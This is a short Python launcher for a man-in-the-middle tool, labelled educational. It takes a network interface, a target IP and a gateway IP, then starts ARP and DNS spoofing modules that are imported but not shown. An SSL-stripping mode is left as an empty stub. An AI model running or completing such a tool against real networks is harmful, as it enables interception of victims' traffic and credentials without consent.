#!/usr/bin/env python3

import argparse
import sys
from modules.arp_spoof import ARPSpoofer
from modules.dns_spoof import DNSSpoofer
from modules.ssl_strip import SSLStripper

def parse_arguments():
    parser = argparse.ArgumentParser(description='MITM Tool for Educational Purposes')
    parser.add_argument('-i', '--interface', required=True, help='Network interface to use')
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-g', '--gateway', required=True, help='Gateway IP address')
    parser.add_argument('-m', '--mode', choices=['arp', 'dns', 'ssl', 'all'], 
                      default='all', help='Attack mode to use')
    return parser.parse_args()

def main():
    args = parse_arguments()
    
    try:
        if args.mode in ['arp', 'all']:
            arp_spoofer = ARPSpoofer(args.interface, args.target, args.gateway)
            arp_spoofer.start()
            
        if args.mode in ['dns', 'all']:
            dns_spoofer = DNSSpoofer(args.interface, args.target, args.gateway)
            dns_spoofer.start()

            
        if args.mode in ['ssl', 'all']:
            # TODO: Add implementation
            pass
            
        # Keep the main thread alive
        while True:
            pass
            
    except KeyboardInterrupt:
        print("\n[*] Shutting down MITM tool...")
        sys.exit(0)

if __name__ == "__main__":
    main() 